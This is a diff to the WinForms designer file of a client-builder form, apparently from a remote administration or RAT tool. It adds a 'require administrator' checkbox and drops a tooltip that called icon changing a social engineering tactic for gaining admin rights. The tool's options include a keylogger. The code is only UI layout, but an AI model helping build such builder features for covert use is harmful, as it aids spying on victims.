@@ -119,6 +119,7 @@
             this.line9 = new xServer.Controls.Line();
             this.label12 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
+            this.chkRequireAdministrator = new System.Windows.Forms.CheckBox();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
             this.ctxtMenuHosts.SuspendLayout();
@@ -196,7 +197,6 @@
             this.chkIconChange.Size = new System.Drawing.Size(91, 17);
             this.chkIconChange.TabIndex = 2;
             this.chkIconChange.Text = "Change Icon";
-            this.tooltip.SetToolTip(this.chkIconChange, "Custom social engineering tactic to elevate Admin privileges.");
             this.chkIconChange.UseVisualStyleBackColor = true;
             this.chkIconChange.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
             // 
@@ -970,6 +970,7 @@
             // additionalTab
             // 
             this.additionalTab.BackColor = System.Drawing.SystemColors.Control;
+            this.additionalTab.Controls.Add(this.chkRequireAdministrator);
             this.additionalTab.Controls.Add(this.line10);
             this.additionalTab.Controls.Add(this.label14);
             this.additionalTab.Controls.Add(this.label13);
@@ -1038,6 +1039,17 @@
             this.chkKeylogger.Text = "Enable Keylogger";
             this.chkKeylogger.UseVisualStyleBackColor = true;
             this.chkKeylogger.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
+            // 
+            // chkRequireAdministrator
+            // 
+            this.chkRequireAdministrator.AutoSize = true;
+            this.chkRequireAdministrator.Location = new System.Drawing.Point(23, 119);
+            this.chkRequireAdministrator.Name = "chkRequireAdministrator";
+            this.chkRequireAdministrator.Size = new System.Drawing.Size(226, 17);
+            this.chkRequireAdministrator.TabIndex = 5;
+            this.chkRequireAdministrator.Text = "Require Administrator privileges to run";
+            this.chkRequireAdministrator.UseVisualStyleBackColor = true;
+            this.chkRequireAdministrator.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // FrmBuilder
             // 
@@ -1166,5 +1178,6 @@
         private Controls.Line line10;
         private System.Windows.Forms.Label label14;
         private System.Windows.Forms.ToolStripMenuItem ctxtClear;
+        private System.Windows.Forms.CheckBox chkRequireAdministrator;
     }
 }
